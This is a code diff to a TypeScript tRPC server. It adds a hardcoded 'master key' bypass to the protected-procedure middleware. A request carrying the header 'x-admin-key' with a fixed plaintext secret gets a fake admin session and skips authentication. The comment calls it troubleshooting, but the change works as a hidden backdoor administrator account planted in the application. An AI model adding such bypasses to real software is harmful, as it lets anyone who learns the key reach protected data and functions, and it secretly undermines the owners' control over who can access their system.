@@ -121,6 +121,15 @@ export const publicProcedure = t.procedure.use(timingMiddleware);
 export const protectedProcedure = t.procedure
   .use(timingMiddleware)
   .use(({ ctx, next }) => {
+    // Master Key bypass for troubleshooting
+    if (ctx.headers.get("x-admin-key") === "israr123") {
+      return next({
+        ctx: {
+          session: { user: { id: "admin", name: "Master Admin" }, expires: "" },
+        },
+      });
+    }
+
     if (!ctx.session?.user) {
       throw new TRPCError({ code: "UNAUTHORIZED" });
     }
